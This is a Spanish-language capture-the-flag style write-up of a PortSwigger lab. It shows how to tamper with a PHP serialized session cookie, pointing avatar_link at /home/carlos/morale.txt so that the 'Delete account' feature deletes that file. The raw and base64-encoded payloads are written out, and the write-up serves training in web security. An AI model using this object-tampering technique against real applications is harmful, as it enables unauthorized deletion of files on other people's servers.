---
title: "Using application functionality to exploit insecure deserialization"
date: 2024-12-29 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - Insecure Deserialization
tags:
  - Insecure Deserialization
  - Using application functionality to exploit insecure deserialization
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` utiliza un mecanismo basado en `serialización` para manejar las `sesiones`. Una determinada `característica` invoca un método tomando como parámetro los `datos` proporcionados en un `objeto serializado`. Para `resolver` el laboratorio, debemos `editar` el `objeto serializado` en la `cookie` de la `sesión` y usarlo para `eliminar` el archivo `morale.txt` del directorio de inicio de `Carlos`. Podemos `iniciar sesión` en nuestra propia cuenta utilizando las credenciales `wiener:peter` También tenemos acceso a una cuenta de respaldo, a la que podemos acceder con las credenciales `gregg:rosebud`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/Insecure-Deserialization-Lab-3/image_1.png)

Pulsamos sobre `My account` y nos `logueamos` utilizando las credenciales `wiener:peter`

![](/assets/img/Insecure-Deserialization-Lab-3/image_2.png)

Al iniciar sesión vemos esto

![](/assets/img/Insecure-Deserialization-Lab-3/image_3.png)

Si pulsamos sobre `Delete account` y capturamos la petición con Burpsuite

![](/assets/img/Insecure-Deserialization-Lab-3/image_4.png)

Podemos modificamos la `ruta` al `avatar`

```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"igl0w35pzxoaof1o4fsavaudvun2e95u";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

Nos copiamos el valor de session modificado, nos dirigimos al navegador y pulsamos `Ctrl + Shift + i`

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImpxeHFjYTFsNDYxY2o2ZHcxeDI0YndmM2NxaWx1NnU5IjtzOjExOiJhdmF0YXJfbGluayI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=
```

![](/assets/img/Insecure-Deserialization-Lab-3/image_5.png)

`Refrescamos` la página pulsando `F5` y pulsamos en `Delete account` nuevamente para borrar el archivo alojado en `/home/carlos/morale.txt`
